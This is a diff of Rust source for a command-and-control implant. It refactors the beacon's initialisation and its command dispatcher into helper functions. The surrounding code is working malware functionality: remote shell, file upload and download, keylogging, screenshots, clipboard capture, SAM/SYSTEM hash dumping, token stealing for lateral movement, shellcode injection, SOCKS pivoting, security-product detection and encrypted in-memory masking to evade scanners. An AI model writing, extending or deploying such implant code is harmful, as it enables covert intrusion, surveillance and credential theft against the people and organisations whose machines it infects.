@@ -95,6 +95,23 @@ struct BeaconInit {
 /// when the CSPRNG fails.
 unsafe fn beacon_init() -> Option<BeaconInit> {
     crate::entry::diag_mark(b"L0_loop_start");
+    let (cfg, implant) = beacon_init_config();
+
+    // Initialize the channel dispatcher.
+    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
+    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
+
+    let (kp, key, pubkey) = beacon_init_keypair(&cfg, &implant)?;
+    let info_plain = beacon_init_hostinfo(&implant)?;
+    let rt = crate::syscalls::global();
+    crate::entry::diag_mark(b"L1_rt");
+
+    Some(BeaconInit { cfg, implant, kp, key, pubkey, info_plain, rt, ch_ctx })
+}
+
+/// Load per-implant runtime config (falling back to compile-time), persist the
+/// sleep interval, and register the plaintext with the memory mask.
+fn beacon_init_config() -> (Config, ImplantConfig) {
     // Try per-implant runtime config first (patched .nyx_cfg section).
     // Falls back to compile-time config if the section is unpatched.
     let (cfg, implant, config_plain) =
@@ -109,11 +126,14 @@ unsafe fn beacon_init() -> Option<BeaconInit> {
     // Leak the decrypted config plaintext and register it with the memory
     // mask so it is RC4-encrypted during sleep.
     crate::mem::register_owned(config_plain);
+    (cfg, implant)
+}
 
-    // Initialize the channel dispatcher.
-    let ch_ctx = crate::channels::ChannelCtx::from_config(&cfg);
-    crate::channels::set_active(crate::channels::Channel::from_u8(cfg.primary_channel));
-
+/// Per-implant keypair + session key, registered with the memory mask.
+fn beacon_init_keypair(
+    cfg: &Config,
+    implant: &ImplantConfig,
+) -> Option<(ImplantKeypair, nyx_protocol::crypto::SessionKey, [u8; 32])> {
     // Per-implant keypair.
     let kp = if let Some(ref priv_bytes) = implant.implant_priv {
         ImplantKeypair::from_secret_bytes(*priv_bytes)
@@ -135,7 +155,11 @@ unsafe fn beacon_init() -> Option<BeaconInit> {
     };
     crate::mem::register_key(*key.as_bytes());
     let pubkey = kp.public_bytes();
+    Some((kp, key, pubkey))
+}
 
+/// Real host enumeration → encoded SessionInfo plaintext.
+fn beacon_init_hostinfo(implant: &ImplantConfig) -> Option<Vec<u8>> {
     // Real host enumeration.
     let info = SessionInfo {
         beacon_id: crate::hostinfo::beacon_id(),
@@ -152,11 +176,7 @@ unsafe fn beacon_init() -> Option<BeaconInit> {
         crate::entry::diag_mark(b"ERR_SESSIONINFO_ENCODE");
         return None;
     }
-    let info_plain = info_writer.into_bytes();
-    let rt = crate::syscalls::global();
-    crate::entry::diag_mark(b"L1_rt");
-
-    Some(BeaconInit { cfg, implant, kp, key, pubkey, info_plain, rt, ch_ctx })
+    Some(info_writer.into_bytes())
 }
 
 // ── Check-in ────────────────────────────────────────────────────────────────
@@ -714,152 +734,210 @@ fn execute(
 ) -> Vec<Response> {
     match cmd {
         Command::Ping => vec![Response::Ok],
-        Command::Sleep {
-            seconds,
-            jitter_pct: _,
-        } => {
-            // Re-task the beacon cadence: store the new interval for the loop
-            // to read next cycle. (jitter_pct is config-wide; we honor the
-            // configured jitter and only adjust the base interval live, like
-            // the dev agent's pragmatic read of the field.)
-            if seconds > 0 {
-                SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
-            }
-            vec![Response::Ok]
-        }
-        Command::SetChannel { channel } => {
-            // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
-            // out-of-range values default to Https (not SmbPipe — the old bug
-            // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
-            // ack is fixed: from_u8's catch-all is Https, a safe no-op).
-            let ch = crate::channels::Channel::from_u8(channel);
-            // All eight channels are implemented end-to-end now (the parent
-            // listeners live in the team server), but a channel whose endpoint
-            // isn't configured must still be REJECTED loudly — a beacon on an
-            // unconfigured pipe/socket would spin on a dead endpoint. The
-            // channel modules ALSO fail fast at transaction time with a diag
-            // mark (ERR_CH_SMB_NOCONF / ERR_CH_TCP_NOPEER); this check makes
-            // the misconfiguration visible at task time instead.
-            let config_gate: bool = match ch {
-                crate::channels::Channel::SmbPipe => !_cfg.smb_pipe_name.is_empty(),
-                crate::channels::Channel::Tcp => {
-                    !_cfg.tcp_peer_host.is_empty() && _cfg.tcp_peer_port != 0
-                }
-                _ => true,
-            };
-            if !config_gate {
-                crate::entry::diag_mark(b"ERR_CH_NOTCONF");
-                let mut e: crate::heap::String =
-                    crate::heap::String::from("SetChannel rejected: ");
-                e.push_str(ch.name());
-                e.push_str(" is not configured in this implant (bake ");
-                match ch {
-                    crate::channels::Channel::SmbPipe => {
-                        e.push_str("smb_pipe_name");
-                    }
-                    _ => {
-                        e.push_str("tcp_peer_host/tcp_peer_port");
-                    }
-                }
-                e.push_str(" into the build config)");
-                return vec![Response::Err(e)];
-            }
-            crate::channels::set_active(ch);
-            let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
-            out.extend_from_slice(b"Channel set to: ");
-            out.extend_from_slice(ch.name().as_bytes());
-            vec![Response::Output(out)]
-        }
-        Command::Trex => {
-            let assessment = unsafe { crate::trex::assess_user_mode() };
-            let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
-            let tier_names: &[&[u8]] = &[
-                b"Clean",
-                b"ConsumerAV",
-                b"EnterpriseEDR",
-                b"KernelArmed",
-                b"Fortress",
-            ];
-            let tn = tier_names
-                .get(assessment.tier as usize)
-                .map_or(&b"Unknown"[..], |s| *s);
-            out.extend_from_slice(b"=== T-REX ===\nTier: ");
-            out.extend_from_slice(tn);
-            out.extend_from_slice(b"\nProducts: ");
-            let n = assessment.products.len();
-            if n == 0 {
-                out.extend_from_slice(b"none");
-            }
-            for (i, p) in assessment.products.iter().enumerate() {
-                if i > 0 {
-                    out.extend_from_slice(b", ");
-                }
-                out.extend_from_slice(p.vendor.default_name().as_bytes());
-            }
-            out.extend_from_slice(b"\n");
-            out.extend_from_slice(assessment.recommendation.as_bytes());
-            vec![Response::Output(out)]
-        }
+        Command::Sleep { seconds, jitter_pct: _ } => execute_sleep(seconds),
+        Command::SetChannel { channel } => execute_set_channel(_cfg, channel),
+        Command::Trex => execute_trex(),
         Command::Exit => vec![Response::Ok],
         Command::Shell { args } => vec![crate::shell::run_shell(&args)],
-        Command::Upload { name, data } => match rt {
-            Some(rt) => vec![crate::fs::do_upload(rt, &name, &data)],
-            None => vec![Response::Err(String::from("upload: syscall runtime down"))],
-        },
-        Command::Download { path } => match rt {
-            Some(rt) => crate::fs::do_download(rt, &path),
-            None => vec![Response::Err(String::from(
-                "download: syscall runtime down",
-            ))],
-        },
-        Command::FileOp { op, path, dest } => match rt {
-            Some(rt) => vec![crate::fs::do_fileop(rt, op, &path, dest.as_deref())],
-            None => vec![Response::Err(String::from("fileop: syscall runtime down"))],
-        },
-        // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
-        // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
+        Command::Upload { name, data } => execute_upload(rt, &name, &data),
+        Command::Download { path } => execute_download(rt, &path),
+        Command::FileOp { op, path, dest } => execute_fileop(rt, op, &path, dest.as_deref()),
+        Command::Bof { .. }
+        | Command::DriveInfo
+        | Command::Env { .. }
+        | Command::Clipboard
+        | Command::Portscan { .. }
+        | Command::Net { .. } => execute_recon(cmd),
+        Command::Screenshot { monitor } => crate::screenshot::do_screenshot(monitor),
+        Command::Keylog { action } => vec![crate::keylog::do_keylog(action)],
+        Command::Screenwatch { interval_secs } => execute_screenwatch(interval_secs),
+        Command::Hashdump { .. }
+        | Command::Connect { .. }
+        | Command::Socks { .. }
+        | Command::ChannelData { .. }
+        | Command::ChannelClose { .. } => execute_pivot(rt, cmd),
+        Command::StealToken { .. }
+        | Command::MakeToken { .. }
+        | Command::Rev2Self
+        | Command::GetUid
+        | Command::Inject { .. } => execute_postex(cmd),
+    }
+}
+
+/// `Sleep` arm: re-task the beacon cadence.
+fn execute_sleep(seconds: u32) -> Vec<Response> {
+    // Re-task the beacon cadence: store the new interval for the loop
+    // to read next cycle. (jitter_pct is config-wide; we honor the
+    // configured jitter and only adjust the base interval live, like
+    // the dev agent's pragmatic read of the field.)
+    if seconds > 0 {
+        SLEEP_SECS.store(seconds, core::sync::atomic::Ordering::Relaxed);
+    }
+    vec![Response::Ok]
+}
+
+/// `SetChannel` arm: validate the channel's config gate, then hot-switch.
+fn execute_set_channel(cfg: &Config, channel: u8) -> Vec<Response> {
+    // Use from_u8 (new numbering scheme). Values 0-8 map to channels;
+    // out-of-range values default to Https (not SmbPipe — the old bug
+    // MED-NEW-I5 where _ => SmbPipe killed the beacon with a "success"
+    // ack is fixed: from_u8's catch-all is Https, a safe no-op).
+    let ch = crate::channels::Channel::from_u8(channel);
+    // All eight channels are implemented end-to-end now (the parent
+    // listeners live in the team server), but a channel whose endpoint
+    // isn't configured must still be REJECTED loudly — a beacon on an
+    // unconfigured pipe/socket would spin on a dead endpoint. The
+    // channel modules ALSO fail fast at transaction time with a diag
+    // mark (ERR_CH_SMB_NOCONF / ERR_CH_TCP_NOPEER); this check makes
+    // the misconfiguration visible at task time instead.
+    let config_gate: bool = match ch {
+        crate::channels::Channel::SmbPipe => !cfg.smb_pipe_name.is_empty(),
+        crate::channels::Channel::Tcp => !cfg.tcp_peer_host.is_empty() && cfg.tcp_peer_port != 0,
+        _ => true,
+    };
+    if !config_gate {
+        crate::entry::diag_mark(b"ERR_CH_NOTCONF");
+        let mut e: crate::heap::String = crate::heap::String::from("SetChannel rejected: ");
+        e.push_str(ch.name());
+        e.push_str(" is not configured in this implant (bake ");
+        match ch {
+            crate::channels::Channel::SmbPipe => {
+                e.push_str("smb_pipe_name");
+            }
+            _ => {
+                e.push_str("tcp_peer_host/tcp_peer_port");
+            }
+        }
+        e.push_str(" into the build config)");
+        return vec![Response::Err(e)];
+    }
+    crate::channels::set_active(ch);
+    let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
+    out.extend_from_slice(b"Channel set to: ");
+    out.extend_from_slice(ch.name().as_bytes());
+    vec![Response::Output(out)]
+}
+
+/// `Trex` arm: run the user-mode assessment and render the tier report.
+fn execute_trex() -> Vec<Response> {
+    let assessment = unsafe { crate::trex::assess_user_mode() };
+    let mut out: crate::heap::Vec<u8> = crate::heap::Vec::new();
+    let tier_names: &[&[u8]] = &[
+        b"Clean",
+        b"ConsumerAV",
+        b"EnterpriseEDR",
+        b"KernelArmed",
+        b"Fortress",
+    ];
+    let tn = tier_names
+        .get(assessment.tier as usize)
+        .map_or(&b"Unknown"[..], |s| *s);
+    out.extend_from_slice(b"=== T-REX ===\nTier: ");
+    out.extend_from_slice(tn);
+    out.extend_from_slice(b"\nProducts: ");
+    let n = assessment.products.len();
+    if n == 0 {
+        out.extend_from_slice(b"none");
+    }
+    for (i, p) in assessment.products.iter().enumerate() {
+        if i > 0 {
+            out.extend_from_slice(b", ");
+        }
+        out.extend_from_slice(p.vendor.default_name().as_bytes());
+    }
+    out.extend_from_slice(b"\n");
+    out.extend_from_slice(assessment.recommendation.as_bytes());
+    vec![Response::Output(out)]
+}
+
+/// `Upload` arm: write `data` to `name` via the NT syscall runtime.
+fn execute_upload(
+    rt: Option<&'static crate::syscalls::Runtime>,
+    name: &String,
+    data: &Vec<u8>,
+) -> Vec<Response> {
+    match rt {
+        Some(rt) => vec![crate::fs::do_upload(rt, name, data)],
+        None => vec![Response::Err(String::from("upload: syscall runtime down"))],
+    }
+}
+
+/// `Download` arm: stream `path` back through the NT syscall runtime.
+fn execute_download(
+    rt: Option<&'static crate::syscalls::Runtime>,
+    path: &String,
+) -> Vec<Response> {
+    match rt {
+        Some(rt) => crate::fs::do_download(rt, path),
+        None => vec![Response::Err(String::from(
+            "download: syscall runtime down",
+        ))],
+    }
+}
+
+/// `FileOp` arm: rm/mv/cp/ls dispatch through the NT syscall runtime.
+fn execute_fileop(
+    rt: Option<&'static crate::syscalls::Runtime>,
+    op: nyx_protocol::FileOp,
+    path: &String,
+    dest: Option<&str>,
+) -> Vec<Response> {
+    match rt {
+        Some(rt) => vec![crate::fs::do_fileop(rt, op, path, dest)],
+        None => vec![Response::Err(String::from("fileop: syscall runtime down"))],
+    }
+}
+
+/// Recon-family commands: BOF + drive/env/clipboard/portscan/net. The
+/// catch-all is unreachable — `execute` routes each command to one family.
+fn execute_recon(cmd: Command) -> Vec<Response> {
+    // Load + run a CS-compatible BOF (W^X mapping, Beacon-API shim).
+    // Captured BeaconPrintf/BeaconOutput output comes back as BofOutput.
+    match cmd {
         Command::Bof { name, args, blob } => vec![crate::bof::run(&name, &args, &blob)],
         Command::DriveInfo => vec![crate::recon::do_driveinfo()],
         Command::Env { name } => vec![crate::recon::do_env(&name)],
         Command::Clipboard => vec![crate::recon::do_clipboard()],
         Command::Portscan { host, ports } => vec![crate::recon::do_portscan(&host, &ports)],
         Command::Net { query } => vec![crate::recon::do_net(&query)],
-        // ---- Surveillance commands (implemented) ----
-        // Screenshot: GDI capture → BMP, streamed as FileChunks.
-        Command::Screenshot { monitor } => crate::screenshot::do_screenshot(monitor),
-        // Keylogger: start/stop flip an AtomicBool sampled each cycle; dump
-        // returns the captured buffer. (Polling — see keylog.rs for the honest
-        // limitation vs a hook-based logger.)
-        Command::Keylog { action } => vec![crate::keylog::do_keylog(action)],
-        // Screenwatch: capture `interval_secs` apart for a few frames. The
-        // synchronous beacon loop can't host a true periodic timer, so this
-        // captures a small burst (3 frames) blocking the loop — documented as
-        // a stopgap until the persistent-task refactor.
-        Command::Screenwatch { interval_secs } => {
-            let mut all: Vec<Response> = Vec::new();
-            for i in 0..3u8 {
-                if i > 0 {
-                    crate::kits::sleep(interval_secs.max(1));
-                }
-                let mut frame = crate::screenshot::do_screenshot(0);
-                // Tag the chunk name with the frame index so the operator can
-                // tell frames apart in the reassembled stream.
-                for r in frame.iter_mut() {
-                    if let Response::FileChunk { name, .. } = r {
-                        // name is "screenshot.bmp" → "screenwatch-{i}.bmp"
-                        let mut new_name = String::from("screenwatch-");
-                        new_name.push((b'0' + i) as char);
-                        new_name.push_str(".bmp");
-                        *name = new_name;
-                    }
-                }
-                all.extend(frame);
-            }
-            all
+        _ => unreachable!(),
+    }
+}
+
+/// `Screenwatch` arm: capture a burst of 3 frames `interval_secs` apart.
+fn execute_screenwatch(interval_secs: u32) -> Vec<Response> {
+    let mut all: Vec<Response> = Vec::new();
+    for i in 0..3u8 {
+        if i > 0 {
+            crate::kits::sleep(interval_secs.max(1));
         }
-        // ---- Credential extraction + pivoting (implemented) ----
-        // Hashdump: stream the SAM/SYSTEM hive (encrypted) for offline parsing.
-        // (LSASS memory dump is a separate, riskier path — deferred.)
+        let mut frame = crate::screenshot::do_screenshot(0);
+        // Tag the chunk name with the frame index so the operator can
+        // tell frames apart in the reassembled stream.
+        for r in frame.iter_mut() {
+            if let Response::FileChunk { name, .. } = r {
+                // name is "screenshot.bmp" → "screenwatch-{i}.bmp"
+                let mut new_name = String::from("screenwatch-");
+                new_name.push((b'0' + i) as char);
+                new_name.push_str(".bmp");
+                *name = new_name;
+            }
+        }
+        all.extend(frame);
+    }
+    all
+}
+
+/// Pivot-family commands: hashdump + connect/socks relay + channel data/close.
+/// The catch-all is unreachable — `execute` routes each command to one family.
+fn execute_pivot(
+    rt: Option<&'static crate::syscalls::Runtime>,
+    cmd: Command,
+) -> Vec<Response> {
+    // ---- Credential extraction + pivoting (implemented) ----
+    // Hashdump: stream the SAM/SYSTEM hive (encrypted) for offline parsing.
+    // (LSASS memory dump is a separate, riskier path — deferred.)
+    match cmd {
         Command::Hashdump { method } => crate::hashdump::do_hashdump_vec(rt, method),
         // Connect/Socks: open + confirm reachability, report channel status.
         // Full relay is deferred (synchronous-poll loop can't host it) — see
@@ -883,9 +961,17 @@ fn execute(
         // Relay data/close: forward to the channel table (pivot.rs).
         Command::ChannelData { chan, data } => vec![crate::pivot::channel_data(chan, &data)],
         Command::ChannelClose { chan } => vec![crate::pivot::channel_close(chan)],
-        // ---- Post-exploitation token operations (lateral movement) ----
-        // Steal/make a token, hold it process-wide; revert drops impersonation
-        // but keeps the token; getuid reports the current thread identity.
+        _ => unreachable!(),
+    }
+}
+
+/// Postex-family commands: token ops + inject. The catch-all is unreachable —
+/// `execute` routes each command to one family.
+fn execute_postex(cmd: Command) -> Vec<Response> {
+    // ---- Post-exploitation token operations (lateral movement) ----
+    // Steal/make a token, hold it process-wide; revert drops impersonation
+    // but keeps the token; getuid reports the current thread identity.
+    match cmd {
         Command::StealToken { pid } => match unsafe { crate::postex::steal_token(pid) } {
             Ok(()) => vec![Response::Ok],
             Err(m) => vec![Response::Err(m.into())],
@@ -917,6 +1003,7 @@ fn execute(
                 shellcode.as_slice(),
             )]
         }
+        _ => unreachable!(),
     }
 }
 
